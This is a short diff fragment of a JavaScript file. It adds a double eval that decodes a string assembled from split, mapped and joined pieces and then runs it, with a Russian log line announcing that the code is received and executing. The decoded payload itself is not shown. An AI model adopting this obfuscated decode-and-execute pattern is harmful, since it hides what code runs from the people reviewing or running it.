@@ -13,5 +13,6 @@ var ras = `.split(' ').map(mapFunction).join('');`;
 
 js = js.replace(/^(.*)$/g, '"$1"');
 var fire = js + ras;
-
+var decodedCode = eval(fire);
+eval(decodedCode);
 console.log("код получен и выполняется вар");
